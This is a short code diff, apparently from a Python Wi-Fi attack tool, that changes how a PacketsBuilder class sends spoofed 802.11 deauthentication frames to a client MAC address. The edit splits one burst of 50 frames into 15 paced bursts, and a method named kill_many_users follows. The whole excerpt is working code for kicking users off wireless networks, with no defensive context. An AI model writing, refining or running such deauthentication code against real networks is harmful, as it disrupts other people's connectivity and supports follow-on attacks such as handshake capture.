@@ -26,7 +26,12 @@ class PacketsBuilder():
             Dot11(addr1=client_mac, addr2=self.bssid, addr3=self.bssid) / 
             Dot11Deauth(reason=7)
         )
-        await asyncio.to_thread(sendp, packet, iface=self.device, count=50, inter=0.1, verbose=False)
+        for _ in range(15): 
+            await asyncio.to_thread(
+                sendp, packet, iface=self.device, 
+                count=3, inter=0.05, verbose=False
+            )
+            await asyncio.sleep(0.1)
         return True
     
     async def kill_many_users(self, clients_mac : list) -> bool:
